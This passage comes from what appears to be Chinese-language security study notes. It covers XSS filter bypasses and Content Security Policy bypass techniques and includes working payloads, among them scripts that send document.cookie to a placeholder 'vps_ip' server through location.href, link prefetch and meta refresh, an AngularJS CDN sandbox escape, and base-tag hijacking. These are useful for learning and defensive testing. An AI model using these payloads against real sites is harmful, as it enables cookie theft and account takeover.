&#x27;&#x27;).replace(reXSSOnload, &#x27;$1&#x27;);</span><br><span class=\"line\">        root.innerHTML = html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1. 贪婪模式导致绕过</p>\n<p>正则在标签名 <code>[A-Za-z][A-Za-z0-9-]*</code>  的后面，使用了 <code>[^&gt;]*</code>  来匹配非 <code>&gt;</code>  的所有字符。</p>\n<p>如果此时有两个 <code>onload=</code> ，那么这个 <code>[^&gt;]*</code>  将会匹配到第二个，而将它删除掉，而第一个 <code>onload=</code>  将被保留。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;&lt;/svg&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>2. 非贪婪绕过</p>\n<p>即使改成非贪婪模式，删除掉的是第一个 <code>onload=</code> ，第二个 <code>onload=</code>  仍然会保留，所以无法解决问题，构造的 Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<p>正则优化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(&lt;[A-Za-z][A-Za-z0-9-]*\\s)([onload=]*))</span><br></pre></td></tr></table></figure>\n<p>3. 字符匹配导致问题</p>\n<p>如果这个正则匹配上 HTML 属性中的一个 <code>&gt;</code> ，则会停止向后匹配，这样 <code>onload=</code>  也能保留下来。Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>总结</p>\n<p>1. 用户交互型</p>\n<blockquote>\n<p>svg use 属性，base64 编码，绕过 JavaScript 关键字</p>\n<p>svg use 属性，charset=ISO-2022-jp，Chrome 忽略特定字符，导致 JavaScript 关键字消失</p>\n</blockquote>\n<p>2. 非用户交互型</p>\n<blockquote>\n<p>1. 条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload&gt;</span><br><span class=\"line\">&lt;detail ontoggle=alert(1)&gt; //在黑名单删除details标签前，就已经将ontoggle事件加载进事件队列中即使删除也会执行</span><br></pre></td></tr></table></figure>\n<p>2. 绕过补丁</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.绕过贪婪匹配</span><br><span class=\"line\">由于贪婪匹配一直会匹配到没有匹配的元素为止，利用两个onload，将会忽略第一个onlad</span><br><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;</span><br><span class=\"line\">2.绕过非贪婪匹配</span><br><span class=\"line\">由于非贪婪只匹配第一个元素，导致第一个onload被删除，第二个onload得以保留</span><br><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br><span class=\"line\">3.字符匹配</span><br><span class=\"line\">正则表达式遇到&gt;就结束</span><br><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h2 id=\"csp\"><a class=\"markdownIt-Anchor\" href=\"#csp\">#</a> CSP</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMjE3NTEtZDhmZmI2YTQtYzJhYi00YzRhLWE1N2YtMGQ1MDY2NDVmZWIyLm1k\">📎CSP 常规绕过思路.md</span></p>\n<p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以</p>\n<p><strong>通过响应包头（Response Header）实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-policy</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">script-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">img-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">style-src</span> <span class=\"string\">&#x27;self&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>通过 HTML 元标签实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;<span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">img-src</span> https://*; <span class=\"keyword\">child-src</span> <span class=\"string\">&#x27;none&#x27;</span>;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>除了 Content-Security-Policy，还有一个 Content-Security-Policy-Report-Only 字段，表示不执行限制选项，只是记录违反限制的行为。它必须与 report-uri 选项配合使用。</p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy-Report-Only</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; ...; <span class=\"keyword\">report-uri</span> /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>\n<h3 id=\"csp指令值\"><a class=\"markdownIt-Anchor\" href=\"#csp指令值\">#</a> CSP 指令值</h3>\n<p>介绍完 CSP 的指令，下面介绍一下指令值，即允许或不允许的资源</p>\n<blockquote>\n<ul>\n<li>*： 星号表示允许任何 URL 资源，没有限制；</li>\n<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>\n<li>data：仅允许数据模式（如 Base64 编码的图片）方式加载资源；</li>\n<li>none：不允许任何资源被加载；</li>\n<li>unsafe-inline：允许使用内联资源，例如内联 <code>&lt;script&gt;</code>  标签，内联事件处理器，内联 <code>&lt;style&gt;</code>  标签等，但出于安全考虑，不建议使用；</li>\n<li>nonce：通过使用一次性加密字符来定义可以执行的内联 js 脚本，服务端生成一次性加密字符并且只能使用一次；</li>\n</ul>\n</blockquote>\n<p>下面通过具体的例子来看看 CSP 指令和指令值的用法：</p>\n<blockquote>\n<p><code>&lt;img src=image.jpg&gt;</code>  该图片来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1zVml1bndJZVJJN3Z1TSUyRkhOR0NNcUElM0QlM0QuWEJKcDJWbUhSTEpkblE4SCUyQk1LbmZxS3JqampabEh6b0h1eXltTXB2VktRJTNE\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=script.js&gt;</code>  该 js 脚本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz13bXlvQ05zZnZhTVdUckxuZWREZkJRJTNEJTNELjBKWmNPNSUyRnowS1dOcWVlb0V1QWVVSXJsVVRmRFlwd3RUTGp0QlFUaXFEMCUzRA==\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=https://examples.com/script.js&gt;</code> ，该 js 脚本将不允许被加载执行，因为来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz11NnE3QXR2M0t6RTFGbWtRaXJCeE1nJTNEJTNELjdQQm81JTJGWUs3bU5wSVZZNkUlMkZ0Z082ME5PZE1YUWlOUUtpeTBFbzZOUk9ZJTNE\"> https://examples.com</span>， 非同源；</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE2LzA5L2NzcC5odG1s\">Content Security Policy 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</span></p>\n<p>CSP 绕过</p>\n<p>1.location.href 绕过</p>\n<p>服务端代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;unsafe-inline&#x27;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>本地代码，模拟接收 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tif (isset($_GET[&#x27;xss&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;xss&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>这个地方可以用 location 跳转：location.href (window.location/window.open) 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=&lt;script&gt;location.href=&quot;http://127.0.0.1&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br><span class=\"line\">http://101.35.139.208:9999/csp.php?a=&lt;script&gt;location.href=&quot;http://127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。</p>\n<p>​\t\t\t\t\tCSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>\n<p>2.link 绕过 (失效)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- firefox --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- chrome --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var link = document.createElement(&quot;link&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class=\"line\">document.head.appendChild(link);</span><br></pre></td></tr></table></figure>\n<p>3.meta 跳转绕过</p>\n<p>与 link 标签原理相似，利用 meta 标签实现网页跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://150.158.188.194:7890/&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p>meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过 CSP nonce。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var ometa = document.createElement(&quot;meta&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;http-equiv&quot;, &quot;refresh&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;content&quot;, &quot;1;url=127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie);</span><br><span class=\"line\">document.head.appendChild(ometa);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>4.iframe 标签绕过</p>\n<p><strong>同源</strong> ，当一个同源站点存在两个页面，我们称它们为 A 页面和 B 页面，假如 A 页面有 CSP 保护，而 B 页面没有，我们就可以直接在 B 页面新建 <code>iframe</code>  用 js 操作 A 页面的 DOM，也就是说 A 页面的 CSP 防护完全失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- A页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- B页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 下面模拟XSS --&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var iframe = document.createElement(&#x27;iframe&#x27;);</span><br><span class=\"line\">iframe.src=&quot;http://127.0.0.1/a.php&quot;;</span><br><span class=\"line\">document.body.appendChild(iframe);</span><br><span class=\"line\">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#x27;flag&#x27;).innerHTML),1000);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>前提条件：主站需要有 xss，需要拿到分站权限</p>\n<p>5.CDN 绕过</p>\n<p>通过白名单中的 cdn 存在漏洞绕过 CSP</p>\n<p>hackmd CSP</p>\n<p>该 md CSP 政策还允许了 <code>https://cdnjs.cloudflare.com/</code>  这个 js hosting 服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助 AngularJS 函数库以及 Client-Side Template Injection 里面成熟的沙盒逃逸技术绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- foo=&quot;--&gt;</span><br><span class=\"line\">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;div ng-app&gt;</span><br><span class=\"line\">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>\n<p>6. 站点静态资源可控绕过</p>\n<ul>\n<li>存在可控静态资源</li>\n<li>站点在 CSP 允许名单中</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;</span><br><span class=\"line\">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>\n<p>7. 不完整 script 绕过</p>\n<p>只适用于火狐，且只能<?php echo $_GET['xss']?> <script nonce='xxx××'>相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>\n<p><code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code></p>\n<p><code>&lt;script</code>  就会被变成一个属性，值为空，之后的 <code>nonce='xxxxx'</code></p>\n<p>会被当成我们输入的 script 标签中的一个属性</p>\n<ul>\n<li>可控点在合法 script 标签上方，且其中没有其他标签</li>\n<li>XSS 页面的 CSP script-src 只采用了 nonce 方式</li>\n</ul>\n<p>需要将后面的没用内容注释，或者加到另一个属性中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)//</span><br><span class=\"line\">x http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1) 123=</span><br></pre></td></tr></table></figure>\n<p>8. 不完整资源标签获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;&gt;</span><br><span class=\"line\">&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br><span class=\"line\">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class=\"line\">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>\n<p>可以使用外联图片的 CSP，将 src 中内容延伸至下一个 &quot;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;img src=&quot;//vps_ip?a= </span><br></pre></td></tr></table></figure>\n<p>baseuri 绕过</p>\n<p>当网站设置了 script nonce， 在无法猜测 nonce 值的情况下，且 base-uri 没有被设置。</p>\n<p>那么可以使用 <code>&lt;base&gt;</code>  标签将文档的基础 URI 修改为自己的服务器地址。</p>\n<p>如下，需要本来文档就存在相对地址加载 js 的情况。最后 只要在自己服务器放上一个 123.js 就行了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;base href=&quot;//xx.xx.xxx.xx:8888&quot;&gt;</span><br><span class=\"line\">&lt;script nonce=&#x27;test&#x27; src=&quot;/123.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>302 跳转</p>\n<p>网站都会带有一个 302 跳转功能的页面，用它来导向到本站的资源或者是外部的链接</p>\n<p>如果我们的 script-src 设置为某个目录，通过这个目录下的 302 跳转，是可以绕过 csp 读取到另一个目录下的脚本的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a/csp.php</span><br><span class=\"line\">&lt;!-- csp.php --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"> header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src http://127.0.0.1/a/&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> &lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">     csp header test </span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">a/redirect.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;Location: &quot; . $_GET[url]);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">b/text.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\"> &lt;title&gt;1&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">123</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>csp 限制了 <code>/a/</code>  目录，而我们的目标脚本在 <code>/b/</code>  目录下则如果这时候请求 <code>redirect</code>  页面去访问 <code>/b/</code>  下的脚本是可以通过 csp 的检查的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/a/redirect.php?url=/b/test.php</span><br></pre></td></tr></table></figure>\n<p>但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下 (<a href=\"http://example.com\">example.com</a>)，也就是不可能通过 302 跳转去加载一个其他域下的脚本的，比如通过</p>\n<p><code>a.com</code>  的 302 跳转去加载 <code>b.com</code>  下的脚本是不可以</p>\n<p>在实际环境中，比如某个站调用某个 cdn，或者类似于 <code>script-src example.com/scripts/ google.com/recaptcha/</code> ， <code>google.com/script/*</code>  下有个 <code>evil.js</code> ，然后刚好站内有个重定向，漏洞条件就已经成立了。</p>\n<ul>\n<li>在 script-src 允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录</li>\n<li>在 script-src 允许的域下，存在某个任意文件的上传点（任意目录）</li>\n<li>有特别的方式可以跨域发送请求，或者有站内域可以接受请求</li>\n</ul>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE1ODkyOC5odG1s\">CSP 浅析与绕过 - SecPulse.COM | 安全脉搏</span></p>\n</blockquote>\n<p>CRLF 文件头</p>\n<p>当一个页面存在 CRLF 漏洞时，且我们的可控点在 CSP 上方，就可以通过注入回车换行，将 CSP 挤到 HTTP 返回体中，这样就绕过了 CSP</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzk0ODM2OC5odG1s\">我的 CSP 绕过思路及总结 | CN-SEC 中文网</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMTU3ODItOWQ2MWU1Y2EtYjViMy00ODE4LTg1OGQtMjJkODA4NWY0YzVmLm1k\">📎通过浏览器缓存来 bypass CSP script nonce.md</span></p>\n<p>条件</p>\n<p>1. 开启缓存，nonce 保存在本地  <code>header( 'cache-Control: max-age=99999999 ' );</code></p>\n<p>不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新 nonce 的字符串</p>\n<p>2. 有 document.write ，截断 href，只会保存 #前面的内容</p>\n<p>3.textarea nonce，textarea 中只能容纳文本</p>\n<p>4.ajax 无刷新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;document.write(&#x27;URL &#x27; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;console.log(&#x27;another nonced script&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>然后我们需要利用 